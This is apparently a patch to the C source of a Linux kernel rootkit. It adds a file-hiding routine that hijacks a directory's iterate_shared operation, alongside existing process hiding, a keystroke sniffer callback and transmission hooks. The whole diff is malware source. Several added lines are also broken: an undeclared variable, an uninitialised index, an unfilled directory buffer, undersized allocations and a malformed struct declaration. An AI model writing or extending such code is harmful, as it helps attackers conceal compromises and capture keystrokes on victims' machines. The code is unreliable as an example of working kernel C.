@@ -67,7 +67,14 @@ static struct list_head* mod_list;
 static size_t hidden_procs[100];
 int hidden_count = 0;
 
-static unsigned char hidden_files[100][256];
+struct hidden_file {
+    struct path path;
+    struct file_operations fops;
+    struct file_operations* backup_fops;
+    struct inode* inode;
+    struct dir_context* backup_ctx;
+    struct dir_context* bad_ctx;
+} static struct hidden_file hidden_files[256];
 int hidden_file_count = 0;
 
 static rwlock_t* my_tasklist_lock;
@@ -94,6 +101,7 @@ int start_transmit(void);
 int init_userspace_conn(void);
 void UpdateChecksum(struct sk_buff* skb);
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
+bool hide_file(const char* user_input, struct hidden_file* hf);
 
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type);
@@ -104,6 +112,10 @@ static struct notifier_block keysniffer_blk = {
 };
 
 struct dir_context bad_ctx = {
+        .actor = rk_filldir_t,
+};
+
+struct dir_context file_ctx = {
         .actor = rk_filldir_t,
 };
 
@@ -595,6 +607,7 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
+    printk(KERN_ALERT "Checking %s\n", proc_name);
 #if 0
     for (i = 0; i < hidden_file_count; ++i) {
         printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i]);
@@ -616,31 +629,46 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
-#if 0
-char name_buf[PATH_MAX];
-int bad_open(struct inode * ino, struct file *f) {
-    char *path_name = dentry_path_raw(f->f_path.dentry, name_buf, PATH_MAX);
-    int i;
-    int result = 0;
+bool hide_file(const char* user_input, struct hidden_file* hf) {
+    int i, j;
+    size_t str_size;
 
-    printk(KERN_ALERT "Bad open called\n");
+    char* user_dir = kmalloc(strlen(user_input), GFP_KERNEL);
+    strcpy(user_string, user_input);
+    char* user_file = kmalloc(strlen(user_input), GFP_KERNEL);
+    memset(user_file, 0, strlen(user_input));
 
-    if (!path_name) {
-        goto legit_open;
-    }
-
-    for (i = 0; i < hidden_file_count; ++i) {
-        if (strncmp(path_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
-            printk(KERN_ALERT "Found my hidden file\n");
-            return -ENOENT;
+    for (i = strlen(user_string) - 1; i >= 0; --i) {
+        if (user_string[i] == '/') {
+            break;
         }
+        user_file[j++] = user_string[i];
+        user_string[i] = '\0';
     }
-    //Perform open call here
-legit_open:
-    result = backup_file_ops->open(ino, f);
-    return result;
+    str_size = strlen(user_file);
+    for (i = 0; i < str_size / 2; ++i) {
+        char tmp = user_file[i];
+        user_file[i] = user_file[str_size - i - 1];
+        user_file[str_size - i - 1] = tmp;
+    }
+
+    printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_dir, user_file);
+
+    if (kern_path(user_dir, 0, &hf->path)) {
+        kfree(user_dir);
+        kfree(user_file);
+        return false;
+    }
+    hf->inode = hf->path.dentry->d_inode;
+    hf->fops = *hf->inode->i_fop;
+    hf->backup_fops = hf->inode->i_fop;
+    hf->fops.iterate_shared = rk_iterate_shared;
+    hf->inode->i_fop = &hf->fops;
+
+    kfree(user_dir);
+    kfree(user_file);
+    return true;
 }
-#endif
 
 /*
  * function:
@@ -682,11 +710,12 @@ static int __init mod_init(void) {
     proc_inode->i_fop = &proc_fops;
 
 #if 1
-    const char *user_input = "/aing-matrix";
+    const char* user_input = "/aing-matrix";
+    //const char *user_input = "/proc/stat";
 
-    char *user_string = kmalloc(100, GFP_KERNEL);
+    char* user_string = kmalloc(100, GFP_KERNEL);
     strcpy(user_string, user_input);
-    char *user_file = kmalloc(100, GFP_KERNEL);
+    char* user_file = kmalloc(100, GFP_KERNEL);
     memset(user_file, 0, 40);
 
     for (i = strlen(user_string) - 1; i >= 0; --i) {
@@ -804,8 +833,8 @@ static void __exit mod_exit(void) {
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
 
-    //my_file_inode = my_file_path.dentry->d_inode;
-    //my_file_inode->i_fop = backup_file_ops;
+    my_file_inode = my_file_path.dentry->d_inode;
+    my_file_inode->i_fop = backup_file_ops;
 
 #if 0
     if (svc) {
